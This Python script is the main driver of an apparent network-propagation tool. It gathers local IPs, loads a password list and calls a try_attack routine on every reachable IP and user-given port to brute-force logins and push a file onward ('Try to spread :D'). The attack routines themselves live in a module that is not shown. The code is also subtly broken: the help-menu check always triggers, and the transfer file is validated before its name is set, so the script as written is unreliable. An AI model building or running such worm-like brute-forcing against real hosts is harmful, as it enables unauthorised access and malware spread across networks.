#!/usr/bin/python3
import logging
import net_propagation
import strings
import sys

"""
 - Importing logging to safely log sensitive, error or debug info.
 - Importing net_propagation for propagating across the network.
 - Importing strings for use of the external strings resources.
 - Importing sys to make OS calls and use OS level utilities.
"""

"""
===PLEASE READ===
This main function itself has more  specific, low level commenting.
"""


def main():
    """
    This main function controls all the things.
    """
    # These arguments are passed in by the end user.
    arguments = sys.argv

    # If there is no arguments then just print the help menu and exit.
    if arguments.__len__():
        net_propagation.gtfo_and_rtfm()

    # Just initialising this for use later.
    transfer_file_filename = ""

    ip_list, target_ports, target_username, passwords_filename = \
        net_propagation.checking_arguments(arguments)

    # The end user specified a local scan must be executed, the result of the
    # local scan will extend the current ip_list.
    if "-L" in arguments:
        logging.info(strings.PERFORMING_LOCAL_SCAN)
        ip_list.extend(net_propagation.gathering_local_ips(ip_list))

    try:
        # Here I made sure the user actually gave a valid file for the
        # passwords list. If they have...
        net_propagation.validate_file_exists(passwords_filename)
        # A list of passwords is created.
        password_list = \
            net_propagation.convert_file_to_list(passwords_filename)
    except RuntimeError:
        # Uh oh, file doesn't exist, alert the user and exit gracefully, so
        # they can either fix their mistake or repent their sins.
        net_propagation.file_error_handler()
        sys.exit()

    # If the user wants to transfer a file, this stuff should be done...
    if "-d" in arguments:
        try:
            # Again making sure the transfer file actually exits, just like
            # the password file above.
            net_propagation.validate_file_exists(transfer_file_filename)
            # if it does though we assign the filename to the name out of scope
            # above.
            transfer_file_filename = arguments[arguments.index("-d") + 1]
        except RuntimeError:
            # File doesn't exist, throw an error and give the usual slap across
            # the wrist.
            net_propagation.file_error_handler()
            sys.exit()
    # Removing duplicate entries in the IP address list, can come from
    # combining local scan with given IP addresses in an ip address file among
    # other things and silliness.
    ip_list = list(dict.fromkeys(ip_list))
    # Removing IPs from the IP list that can't be pinged from the host machine
    # of the script.
    ip_list = net_propagation.remove_unreachable_ips(ip_list)
    # Getting a list of ports by splitting the target ports specified by the
    # user on the comma.
    ports = target_ports.split(",")
    # Cycling through every IP in the IP list...
    for ip in ip_list:
        # And then using all user specified ports against that specific IP...
        for port in ports:
            # Try to spread :D
            net_propagation.try_attack(ip, port, target_username,
                                       password_list, transfer_file_filename,
                                       arguments)


main()
